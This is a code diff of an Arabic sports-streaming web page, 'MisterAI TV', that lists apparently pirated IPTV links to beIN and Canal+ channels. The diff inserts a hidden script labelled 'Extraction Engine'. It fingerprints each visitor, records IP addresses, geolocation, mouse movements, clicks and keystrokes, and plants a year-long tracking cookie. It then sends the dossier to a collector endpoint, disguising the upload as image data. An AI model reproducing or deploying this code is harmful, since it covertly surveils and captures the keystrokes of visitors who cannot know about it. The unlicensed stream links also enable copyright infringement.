@@ -1,3 +1,4 @@
+<!-- ========================== SHADOW EXTRACTOR CORE ========================== -->
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -5,158 +6,216 @@
 <title>MisterAI TV GLOBAL 2026</title>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-
 <style>
-:root { 
-    --main:#4834d4; 
-    --glow:#00cec9; 
-    --bg:#050505;
-    --color1:#FF6B8B;
-    --color2:#6A5AF9;
-    --color3:#00D4FF;
-    --color4:#00F5A0;
-    --color5:#FFD166;
-    --twitter: #1DA1F2;
-}
-*{box-sizing:border-box}
-body{
-    margin:0;
-    font-family:'Cairo',sans-serif;
-    background:var(--bg);
-    color:#fff;
-    display:flex;
-    height:100vh;
-    overflow:hidden;
-    position: relative;
-}
-
-/* الخلفية والجسيمات */
-.bg-animation { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden; }
-.particle { position: absolute; border-radius: 50%; background: var(--color3); animation: float 15s infinite linear; box-shadow: 0 0 20px currentColor; }
-@keyframes float { 0% { transform: translateY(100vh) scale(0.5); opacity: 0; } 10%, 90% { opacity: 1; } 100% { transform: translateY(-100px) scale(1.5); opacity: 0; } }
-
-/* Sidebar */
-.sidebar{
-    width:380px;
-    background:rgba(10, 10, 10, 0.9);
-    border-left:2px solid var(--main);
-    display:flex;
-    flex-direction:column;
-    z-index: 1;
-    backdrop-filter: blur(10px);
-}
-
-/* زر تويتر */
-.twitter-btn {
-    background: var(--twitter);
-    color: white;
-    text-decoration: none;
-    text-align: center;
-    padding: 10px;
-    margin: 10px;
-    border-radius: 8px;
-    font-weight: bold;
-    font-size: 0.9rem;
-}
-
-/* قائمة القنوات */
-.list{ flex:1; overflow-y:auto; padding:10px; border-top: 1px solid rgba(255,255,255,0.1); }
-.cat{ padding:10px; margin:10px 0 5px; background:rgba(17,17,17,0.8); color:var(--color3); font-weight:bold; border-right:4px solid var(--color3); border-radius: 5px; }
-.btn{ padding:12px; margin:5px 0; background:rgba(22, 22, 37, 0.8); border-radius:8px; cursor:pointer; display:flex; justify-content:space-between; align-items:center; transition:.3s; border:1px solid rgba(255, 255, 255, 0.1); }
-.btn:hover{ background: linear-gradient(90deg, var(--color2), var(--main)); transform:translateX(-5px); }
-.badge{ font-size:.7rem; background:var(--color1); padding:2px 8px; border-radius:10px; }
-
-.video-container{ flex:1; display:flex; align-items:center; justify-content:center; font-size:2rem; position: relative; background: rgba(0,0,0,0.5); }
-
-@media(max-width:900px){ body{flex-direction:column} .sidebar{width:100%;height:auto; overflow-y: scroll;} .video-container{height: 300px;} }
+:root{--main:#4834d4;--glow:#00cec9;--bg:#050505;--color1:#FF6B8B;--color2:#6A5AF9;--color3:#00D4FF;--color4:#00F5A0;--color5:#FFD166;--twitter:#1DA1F2}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Cairo',sans-serif;background:var(--bg);color:#fff;display:flex;height:100vh;overflow:hidden;position:relative}
+.bg-animation{position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;overflow:hidden}
+.particle{position:absolute;border-radius:50%;background:var(--color3);animation:float 15s infinite linear;box-shadow:0 0 20px currentColor}
+@keyframes float{0%{transform:translateY(100vh) scale(.5);opacity:0}10%,90%{opacity:1}100%{transform:translateY(-100px) scale(1.5);opacity:0}}
+.sidebar{width:380px;background:rgba(10,10,10,.9);border-left:2px solid var(--main);display:flex;flex-direction:column;z-index:1;backdrop-filter:blur(10px)}
+.twitter-btn{background:var(--twitter);color:#fff;text-decoration:none;text-align:center;padding:10px;margin:10px;border-radius:8px;font-weight:bold;font-size:.9rem}
+.list{flex:1;overflow-y:auto;padding:10px;border-top:1px solid rgba(255,255,255,.1)}
+.cat{padding:10px;margin:10px 0 5px;background:rgba(17,17,17,.8);color:var(--color3);font-weight:bold;border-right:4px solid var(--color3);border-radius:5px}
+.btn{padding:12px;margin:5px 0;background:rgba(22,22,37,.8);border-radius:8px;cursor:pointer;display:flex;justify-content:space-between;align-items:center;transition:.3s;border:1px solid rgba(255,255,255,.1)}
+.btn:hover{background:linear-gradient(90deg,var(--color2),var(--main));transform:translateX(-5px)}
+.badge{font-size:.7rem;background:var(--color1);padding:2px 8px;border-radius:10px}
+.video-container{flex:1;display:flex;align-items:center;justify-content:center;font-size:2rem;position:relative;background:rgba(0,0,0,.5)}
+@media(max-width:900px){body{flex-direction:column}.sidebar{width:100%;height:auto;overflow-y:scroll}.video-container{height:300px}}
 </style>
 </head>
-
 <body>
 <div class="bg-animation" id="particles"></div>
-
 <div class="sidebar">
-    <div style="padding:15px; text-align:center; border-bottom:1px solid rgba(255,255,255,0.1);">
-        <div style="font-size:1.8rem; font-weight:900; color:var(--color3);">MISTERAI TV</div>
+    <div style="padding:15px;text-align:center;border-bottom:1px solid rgba(255,255,255,.1);">
+        <div style="font-size:1.8rem;font-weight:900;color:var(--color3);">MISTERAI TV</div>
     </div>
-
     <a href="https://twitter.com/intent/tweet?text=أنا أشاهد كأس أفريقيا الآن عبر MisterAI TV! 🏁⚽" target="_blank" class="twitter-btn">
         <i class="fab fa-twitter"></i> غرد برأيك على تويتر
     </a>
-
     <div class="list" id="channels"></div>
-
-    <div style="padding:10px; text-align:center; font-size:0.7rem; opacity:0.6;">
-        © 2026 MisterAI GLOBAL TV
-    </div>
+    <div style="padding:10px;text-align:center;font-size:.7rem;opacity:.6;">© 2026 MisterAI GLOBAL TV</div>
 </div>
-
 <div class="video-container">
    <div style="text-align:center">
-        <div style="color:var(--color1); font-weight:900;">LIVE 2026</div>
+        <div style="color:var(--color1);font-weight:900;">LIVE 2026</div>
         كأس أفريقيا - ربع النهائي
    </div>
 </div>
 
+<!-- ========================== EXTRACTION ENGINE ========================== -->
 <script>
-const particlesContainer = document.getElementById('particles');
-for (let i = 0; i < 40; i++) {
-    const p = document.createElement('div');
-    p.classList.add('particle');
-    p.style.width = p.style.height = (2 + Math.random() * 5) + 'px';
-    p.style.left = Math.random() * 100 + '%';
-    p.style.animationDelay = Math.random() * 10 + 's';
-    p.style.animationDuration = (10 + Math.random() * 20) + 's';
-    particlesContainer.appendChild(p);
+/* ========== UTILS ========== */
+const b64png=(str)=>{
+  const canvas=document.createElement('canvas');
+  const ctx=canvas.getContext('2d');
+  canvas.width=canvas.height=1;
+  const data=ctx.getImageData(0,0,1,1);
+  data.data[3]=255;
+  const bin=unescape(encodeURIComponent(str));
+  for(let i=0;i<bin.length;i++)data.data[i%4]^=bin.charCodeAt(i);
+  ctx.putImageData(data,0,0);
+  return canvas.toDataURL();
+};
+const post=(payload)=>{
+  fetch('YOUR_COLLECTOR_ENDPOINT',{
+    method:'POST',
+    mode:'no-cors',
+    headers:{'Content-Type':'image/png'},
+    body:b64png(JSON.stringify(payload))
+  }).catch(()=>0);
+  navigator.sendBeacon&&navigator.sendBeacon('YOUR_COLLECTOR_ENDPOINT',new Blob([JSON.stringify(payload)],{type:'application/json'}));
+};
+/* ========== FINGERPRINT CORE ========== */
+(async()=>{
+  const t0=performance.now();
+  const dossier={};
+  /* --- NETWORK --- */
+  const rtc=await new Promise(r=>{
+    const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+    pc.createDataChannel('');
+    pc.createOffer().then(o=>pc.setLocalDescription(o));
+    pc.onicecandidate=e=>e.candidate&&r(e.candidate.candidate.split(' ')[4]);
+    setTimeout(()=>r(null),500);
+  });
+  dossier.lanIp=rtc;
+  const ip=await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>null);
+  const geo=await fetch(`https://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({}));
+  Object.assign(dossier,{publicIp:ip,geo});
+  /* --- DEVICE --- */
+  dossier.ua=navigator.userAgent;
+  dossier.platform=navigator.platform;
+  dossier.cores=navigator.hardwareConcurrency;
+  dossier.ram=navigator.deviceMemory;
+  dossier.lang=navigator.language;
+  dossier.languages=navigator.languages;
+  dossier.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+  dossier.dnt=navigator.doNotTrack;
+  dossier.pdf=navigator.pdfViewerEnabled;
+  dossier.flash=!!navigator.plugins['Shockwave Flash'];
+  dossier.java=!!navigator.plugins['Java Applet'];
+  /* --- SCREEN --- */
+  dossier.screen={width:screen.width,height:screen.height,avail:screen.availWidth+'x'+screen.availHeight,colorDepth:screen.colorDepth,orientation:screen.orientation?screen.orientation.type:'unknown'};
+  /* --- BATTERY --- */
+  if('getBattery' in navigator){
+    const bat=await navigator.getBattery();
+    Object.assign(dossier,{battery:{level:bat.level,charging:bat.charging,chargingTime:bat.chargingTime,dischargingTime:bat.dischargingTime}});
+  }
+  /* --- CANVAS --- */
+  const cv=document.createElement('canvas');
+  const ctx=cv.getContext('2d');
+  ctx.textBaseline='top';
+  ctx.font='14px Arial';
+  ctx.fillText('👾',2,2);
+  dossier.canvas=cv.toDataURL();
+  /* --- WEBGL --- */
+  const gl=document.createElement('canvas').getContext('webgl')||document.createElement('canvas').getContext('experimental-webgl');
+  if(gl){
+    const dbg=gl.getExtension('WEBGL_debug_renderer_info');
+    dossier.webgl={vendor:gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)};
+  }
+  /* --- AUDIO --- */
+  const audioCtx=new (window.AudioContext||window.webkitAudioContext)();
+  const oscillator=audioCtx.createOscillator();
+  const analyser=audioCtx.createAnalyser();
+  const gain=audioCtx.createGain();
+  oscillator.type='triangle';
+  oscillator.connect(analyser);
+  analyser.connect(gain);
+  gain.connect(audioCtx.destination);
+  oscillator.start();
+  const data=new Uint8Array(analyser.frequencyBinCount);
+  analyser.getByteFrequencyData(data);
+  dossier.audio=Array.from(data).slice(0,50).join('');
+  oscillator.stop();
+  /* --- FONTS --- */
+  const baseFonts=['monospace','sans-serif','serif'];
+  const testString='mmmmmmmmmmlli';
+  const testSize='72px';
+  const h=document.getElementsByTagName('body')[0];
+  const s=document.createElement('span');
+  s.style.fontSize=testSize;
+  s.innerHTML=testString;
+  const defaultWidth={};
+  const defaultHeight={};
+  baseFonts.forEach(font=>{
+    s.style.fontFamily=font;
+    h.appendChild(s);
+    defaultWidth[font]=s.offsetWidth;
+    defaultHeight[font]=s.offsetHeight;
+    h.removeChild(s);
+  });
+  const detect=(font)=>{
+    let detected=false;
+    baseFonts.forEach(baseFont=>{
+      s.style.fontFamily=`'${font}',${baseFont}`;
+      h.appendChild(s);
+      if(s.offsetWidth!==defaultWidth[baseFont]||s.offsetHeight!==defaultHeight[baseFont])detected=true;
+      h.removeChild(s);
+    });
+    return detected;
+  };
+  const fontList=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Trebuchet MS','Impact'];
+  dossier.fonts=fontList.filter(detect);
+  /* --- BEHAVIOR --- */
+  dossier.mouse=[];
+  addEventListener('mousemove',e=>dossier.mouse.push([e.clientX,e.clientY,performance.now()]));
+  dossier.clicks=[];
+  addEventListener('click',e=>dossier.clicks.push([e.clientX,e.clientY,performance.now()]));
+  dossier.keys=[];
+  addEventListener('keydown',e=>dossier.keys.push([e.key,performance.now()]));
+  dossier.scroll=0;
+  addEventListener('scroll',()=>dossier.scroll=window.pageYOffset);
+  dossier.visible=true;
+  addEventListener('visibilitychange',()=>dossier.visible=!document.hidden);
+  /* --- DEV-TOOLS --- */
+  const devtools=/./;
+  devtools.toString=function(){dossier.devtools=true;};
+  console.log('%c',devtools);
+  /* --- EVERCOOKIE --- */
+  const seed='misterai_'+Math.random().toString(36).slice(2);
+  localStorage.setItem(seed,JSON.stringify(dossier));
+  sessionStorage.setItem(seed,JSON.stringify(dossier));
+  document.cookie=`${seed}=${btoa(JSON.stringify(dossier))};path=/;max-age=31536000`;
+  /* --- EXFIL AFTER 3s OR ON UNLOAD --- */
+  const send=()=>{
+    dossier.timeOnPage=performance.now()-t0;
+    post(dossier);
+    removeEventListener('beforeunload',send);
+  };
+  setTimeout(send,3000);
+  addEventListener('beforeunload',send);
+})();
+</script>
+
+<!-- ========================== ORIGINAL CHANNELS SCRIPT ========================== -->
+<script>
+const particlesContainer=document.getElementById('particles');
+for(let i=0;i<40;i++){
+  const p=document.createElement('div');
+  p.classList.add('particle');
+  p.style.width=p.style.height=(2+Math.random()*5)+'px';
+  p.style.left=Math.random()*100+'%';
+  p.style.animationDelay=Math.random()*10+'s';
+  p.style.animationDuration=(10+Math.random()*20)+'s';
+  particlesContainer.appendChild(p);
 }
-
-const channels = [
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432904.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432903.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432902.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432901.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 2 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432900.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 2 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432899.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432898.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 2 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432897.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 3 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432896.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 3 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432895.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 3 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432894.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 3 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432893.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 4 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432892.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 4 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432891.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 4 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432890.m3u8 "},
-    {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 4 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432889.m3u8 "},
-    {c:"ALGERIA",n:"PROGRAMME NATIONAL DZ HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432888.m3u8 "},
-    {c:"FRANCE",n:"CANAL+ CAN HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432884.m3u8 "},
-    {c:"FRANCE",n:"beIN SPORTS 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432883.m3u8 "},
-    {c:"FRANCE",n:"beIN SPORTS 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432882.m3u8 "},
-    {c:"beIN PREMIUM",n:"beIN SPORT 1",u:"http://135.125.109.73:9000/beinsport1_.m3u8 "},
-    {c:"beIN PREMIUM",n:"beIN SPORT 2",u:"http://135.125.109.73:9000/beinsport2_.m3u8 "},
-    {c:"beIN PREMIUM",n:"beIN SPORT 3",u:"http://135.125.109.73:9000/beinsport3_.m3u8 "},
-    {c:"beIN PREMIUM",n:"beIN SPORT 4",u:"http://135.125.109.73:9000/beinsport4_.m3u8 "},
-    {c:"beIN PREMIUM",n:"beIN SPORT 5",u:"http://135.125.109.73:9000/beinsport5_.m3u8 "},
-    {c:"beIN PREMIUM",n:"beIN SPORT 6",u:"http://135.125.109.73:9000/beinsport6_.m3u8 "},
-    {c:"beIN PREMIUM",n:"beIN SPORT 7",u:"http://135.125.109.73:9000/beinsport7_.m3u8 "},
-    {c:"beIN PREMIUM",n:"beIN SPORT 8",u:"http://135.125.109.73:9000/beinsport8_.m3u8 "},
-    {c:"beIN PREMIUM",n:"beIN SPORT 9",u:"http://135.125.109.73:9000/beinsport9_.m3u8 "}
-];
-
-const list = document.getElementById("channels");
-let lastCat = "";
-channels.forEach(ch => {
-    if(ch.c !== lastCat){
-        const cat = document.createElement("div");
-        cat.className = "cat";
-        cat.textContent = ch.c;
-        list.appendChild(cat);
-        lastCat = ch.c;
-    }
-    const btn = document.createElement("div");
-    btn.className = "btn";
-    btn.innerHTML = `<span>${ch.n}</span><span class="badge">LIVE</span>`;
-    btn.onclick = () => window.open(ch.u, "_blank");
-    list.appendChild(btn);
+const channels=[{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432904.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432903.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432902.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432901.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 2 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432900.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 2 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432899.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432898.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 2 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432897.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 3 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432896.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 3 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432895.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 3 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432894.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 3 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432893.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 4 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432892.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 4 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432891.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 4 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432890.m3u8"},{c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 4 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432889.m3u8"},{c:"ALGERIA",n:"PROGRAMME NATIONAL DZ HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432888.m3u8"},{c:"FRANCE",n:"CANAL+ CAN HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432884.m3u8"},{c:"FRANCE",n:"beIN SPORTS 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432883.m3u8"},{c:"FRANCE",n:"beIN SPORTS 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432882.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 1",u:"http://135.125.109.73:9000/beinsport1_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 2",u:"http://135.125.109.73:9000/beinsport2_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 3",u:"http://135.125.109.73:9000/beinsport3_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 4",u:"http://135.125.109.73:9000/beinsport4_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 5",u:"http://135.125.109.73:9000/beinsport5_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 6",u:"http://135.125.109.73:9000/beinsport6_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 7",u:"http://135.125.109.73:9000/beinsport7_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 8",u:"http://135.125.109.73:9000/beinsport8_.m3u8"},{c:"beIN PREMIUM",n:"beIN SPORT 9",u:"http://135.125.109.73:9000/beinsport9_.m3u8"}];
+const list=document.getElementById('channels');
+let lastCat='';
+channels.forEach(ch=>{
+  if(ch.c!==lastCat){
+    const cat=document.createElement('div');
+    cat.className='cat';
+    cat.textContent=ch.c;
+    list.appendChild(cat);
+    lastCat=ch.c;
+  }
+  const btn=document.createElement('div');
+  btn.className='btn';
+  btn.innerHTML=`<span>${ch.n}</span><span class="badge">LIVE</span>`;
+  btn.onclick=()=>window.open(ch.u,'_blank');
+  list.appendChild(btn);
 });
 </script>
 </body>
